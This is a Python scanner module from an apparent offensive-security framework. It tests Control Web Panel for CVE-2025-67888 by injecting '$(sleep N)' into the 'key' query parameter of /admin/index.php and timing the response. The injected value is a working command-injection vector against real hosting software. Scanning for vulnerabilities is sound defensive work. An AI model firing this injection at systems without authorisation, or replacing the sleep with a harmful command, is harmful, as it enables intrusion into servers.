#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Control Web Panel Unauthenticated RCE Scanner
Detects CVE-2025-67888 - Unauthenticated OS command injection
"""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import time
import random


class Module(Scanner, Http_client):
    """Detects Control Web Panel vulnerable to CVE-2025-67888"""

    __info__ = {
        'name': 'Control Web Panel Unauthenticated RCE Scanner',
        'description': 'Detects CWP versions <= 0.9.8.1208 vulnerable to unauthenticated RCE (CVE-2025-67888)',
        'author': 'KittySploit Team',
        'tags': ['cwp', 'cve-2025-67888', 'rce', 'scanner', 'http'],
        'references': [
            'CVE-2025-67888',
            'https://karmainsecurity.com/KIS-2025-09',
            'https://www.cve.org/CVERecord?id=CVE-2025-67888'
        ],
        'module': 'exploits/http/cwp_unauth_rce'
    }

    def run(self):
        """Check if CWP is vulnerable by testing command injection with sleep"""
        try:
            sleep_time = random.randint(3, 5)
            
            # Record start time
            start_time = time.time()
            
            # Send request with sleep command
            path = "/admin/index.php"
            params = {
                'api': '1',
                'key': f"$(sleep {sleep_time})"
            }
            from urllib.parse import urlencode
            query_string = urlencode(params)
            full_path = f"{path}?{query_string}"
            
            response = self.http_request(
                method="GET",
                path=full_path,
                allow_redirects=False,
                timeout=sleep_time + 5
            )
            
            # Calculate elapsed time
            elapsed_time = time.time() - start_time
            
            # If response took significantly longer than expected, command injection worked
            if elapsed_time >= sleep_time:
                self.set_info(reason=f'Command injection detected (sleep {sleep_time}s, elapsed {elapsed_time:.1f}s)')
                return True
            
            return False
        except:
            return False
